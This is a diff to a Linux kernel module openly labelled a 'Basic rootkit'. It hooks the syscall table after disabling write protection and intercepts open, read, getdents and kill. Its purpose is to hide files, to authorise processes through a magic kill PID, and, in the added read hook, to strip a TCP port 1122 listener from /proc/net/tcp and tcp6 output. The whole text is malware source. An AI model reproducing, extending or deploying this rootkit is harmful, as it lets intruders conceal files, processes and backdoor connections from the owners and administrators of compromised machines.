@@ -14,7 +14,7 @@ MODULE_AUTHOR("Antoine Rouquette");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Basic rootkit");
 
-#define SYS_CALL_TABLE_ADDR 0xffffffff87e00220
+#define SYS_CALL_TABLE_ADDR 0xffffffff97200220
 #define KALLSYMS_PATH       "/proc/kallsyms"
 #define FILE_PATH           "/tmp/hack"
 #define FILE_PATH_SIZE      9
@@ -22,10 +22,24 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define FILE_BASENAME_SIZE  4
 #define MAGIC_KILL_PID		1234
 #define MAX_PIDS			8
-
+#define MIN(a,b)			((a < b) ? a : b)
+#define TCP_PORT			1122
+#define TCP_PORT_HEX		"00000000:0462"
 
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
+
+struct vip_files
+{
+	char * name;
+	int fd;
+};
+
+struct vip_files vip_filenames[] = {
+										{.name = "/proc/net/tcp", .fd = -1},
+										{.name = "/proc/net/tcp6", .fd = -1}
+									};
+const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
 
 struct linux_dirent 
 {
@@ -45,6 +59,7 @@ asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *d
 asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
 asmlinkage pid_t (*original_sys_getpid) (void);
 asmlinkage pid_t (*original_sys_getppid) (void);
+asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count); 
 
 /*  
  * File system, one layer deep into kernel
@@ -59,6 +74,22 @@ static int is_proc_authorized(pid_t pid)
 		if(pid == authorized_pids[i])
 			return 1;
 	return 0;
+}
+
+// -1 if not VIP, index in the table otherwise
+static int get_vip_index(const char * filename)
+{
+	size_t i = 0;
+	
+	if(!filename || !strlen(filename))
+		return -1;
+	
+	for(i=0; i < vip_filenames_size; i++)
+	{
+		if(!strncmp(vip_filenames[i].name, filename, MIN(strlen(vip_filenames[i].name),strlen(filename))))
+			return i;
+	}
+	return -1;
 }
 
 struct file *file_open(const char *path, int flags, int rights)
@@ -125,31 +156,75 @@ int file_sync(struct file * file)
  
 asmlinkage int fake_sys_open(const char *pathname, int flags)
 {
+	int fd = -1;
+	int is_vip = -1;
+ 
 	pid_t pid  = original_sys_getpid();
     pid_t ppid = original_sys_getppid();
 
+	is_vip = get_vip_index(pathname);
+
 	// If authorized, we can open the file
 	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
-		return original_sys_open(pathname, flags);
+	{
+		fd = original_sys_open(pathname, flags);
+		if(is_vip >= 0)
+			vip_filenames[is_vip].fd = fd;
+	}
 	else
 	{
-		if(strstr(pathname, FILE_BASENAME))
-			return -1;
-		else
-			return original_sys_open(pathname, flags);
+		if(!strstr(pathname, FILE_BASENAME))
+		{
+			fd = original_sys_open(pathname, flags);
+			if(is_vip >= 0)
+				vip_filenames[is_vip].fd = fd;
+		}
 	}
+	return fd;
 }
 
-asmlinkage int fake_sys_kill(pid_t pid, int sig)
+asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
 {
-	int ret = 0;
-	if(pid == MAGIC_KILL_PID)
+	int 	i	= 0;
+	ssize_t ret = 0;
+	char ** tmp_str = NULL;
+	char * tok = NULL;
+	char * tmp = NULL;
+	char * final = NULL;
+	char tampon[512];
+
+	for(i = 0; i < vip_filenames_size; i++)
+		if(vip_filenames[i].fd == fd)
+			break;
+
+	ret = original_sys_read(fd, buf, count);
+	// Not a vip file, read in normally
+	if(i == vip_filenames_size)
+		return ret;
+
+	tmp = (char*)vmalloc(count);
+	final = (char*)vmalloc(count);
+	memcpy(tmp, buf, count);
+	tmp_str = &tmp;
+
+	//lets just print buf for now
+	while((tok = strsep(tmp_str, "\n")) != NULL)
 	{
-		if(authorized_pids_cnt < MAX_PIDS)
-			authorized_pids[authorized_pids_cnt++] = current->pid;
+		if(strlen(tok) == 0)
+			continue;
+		else if(strstr(tok, TCP_PORT_HEX))
+			continue;
+		snprintf(tampon, 512, "%s\n", tok);
+		strcat(final, tampon);
+		printk("[%s][%s] extracting line %s\n", __this_module.name, vip_filenames[i].name, tok);
 	}
-	else
-		ret = original_sys_kill(pid, sig);
+
+	strcat(final, "\0");
+	memcpy(buf, final, count);
+	vfree(final);
+	vfree(tmp);
+	vip_filenames[i].fd = -1;
+
 	return ret;
 }
 
@@ -178,6 +253,19 @@ asmlinkage int fake_sys_close(unsigned int fd)
     return original_sys_close(fd);
 }
 
+asmlinkage int fake_sys_kill(pid_t pid, int sig)
+{
+	int ret = 0;
+	if(pid == MAGIC_KILL_PID)
+	{
+		if(authorized_pids_cnt < MAX_PIDS)
+			authorized_pids[authorized_pids_cnt++] = current->pid;
+	}
+	else
+		ret = original_sys_kill(pid, sig);
+	return ret;
+}
+
 asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
 	// Get the relevant informations
@@ -194,12 +282,8 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     pid_t					ppid	    = original_sys_getppid();
 
 	if(is_proc_authorized(pid) || is_proc_authorized(ppid))
-	{
-		printk("[%s] [OK] pid[%d]\n", __this_module.name, current->pid);
 		return original_sys_getdents(fd, dirp, count);
-	}
 
-	printk("[%s] [KO] pid[%d]\n", __this_module.name, current->pid);
 	nread = original_sys_getdents(fd, dirp, count);
 
     buf = (char*)dirp;
@@ -208,24 +292,23 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
         return nread;
     else if(nread == 0)
         return nread;
-        
-	printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
-	printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
 
 	for(bpos = 0; bpos < nread;)
 	{
 		dir = (struct linux_dirent *)(buf + bpos);
-		d_type = *(buf + bpos + dir->d_reclen - 1);
-		snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
-			(d_type == DT_REG) ?  "regular" :
-			(d_type == DT_DIR) ?  "directory" :
-			(d_type == DT_FIFO) ? "FIFO" :
-			(d_type == DT_SOCK) ? "socket" :
-			(d_type == DT_LNK) ?  "symlink" :
-			(d_type == DT_BLK) ?  "block dev" :
-			(d_type == DT_CHR) ?  "char dev" : "???",
-			dir->d_reclen, (long long) dir->d_off, dir->d_name);
-		printk("[%s] %s", __this_module.name, logs);
+		//~ d_type = *(buf + bpos + dir->d_reclen - 1);
+		//~ snprintf(logs, LOGS_SIZE,"%8ld    %-10s  %4d %10lld  %s\n", dir->d_ino,
+			//~ (d_type == DT_REG) ?  "regular" :
+			//~ (d_type == DT_DIR) ?  "directory" :
+			//~ (d_type == DT_FIFO) ? "FIFO" :
+			//~ (d_type == DT_SOCK) ? "socket" :
+			//~ (d_type == DT_LNK) ?  "symlink" :
+			//~ (d_type == DT_BLK) ?  "block dev" :
+			//~ (d_type == DT_CHR) ?  "char dev" : "???",
+			//~ dir->d_reclen, (long long) dir->d_off, dir->d_name);
+		//~ printk("[%s] --------------- nread=%d ---------------\n", __this_module.name, nread);
+		//~ printk("[%s] inode#    file type  d_reclen  d_off   d_name\n", __this_module.name);
+		//~ printk("[%s] %s", __this_module.name, logs);
 
 		if(strlen(dir->d_name) > 3)
 		{
@@ -262,6 +345,7 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 static int __init lkm_init(void)
 {
     original_sys_open      	= sys_call[__NR_open];
+    original_sys_read      	= sys_call[__NR_read];
     original_sys_close      = sys_call[__NR_close];
     original_sys_getdents   = sys_call[__NR_getdents];
     original_sys_kill   	= sys_call[__NR_kill];
@@ -269,6 +353,7 @@ static int __init lkm_init(void)
     original_sys_getppid   	= sys_call[__NR_getppid];
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]    	= fake_sys_open;
+    sys_call[__NR_read]    	= fake_sys_read;
     sys_call[__NR_close]    = fake_sys_close;
     sys_call[__NR_getdents] = fake_sys_getdents;
     sys_call[__NR_kill] 	= fake_sys_kill;
@@ -282,6 +367,7 @@ static void __exit lkm_exit(void)
 {
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open] 	= original_sys_open;
+    sys_call[__NR_read] 	= original_sys_read;
     sys_call[__NR_close] 	= original_sys_close;
     sys_call[__NR_getdents] = original_sys_getdents;
     sys_call[__NR_kill] 	= original_sys_kill;
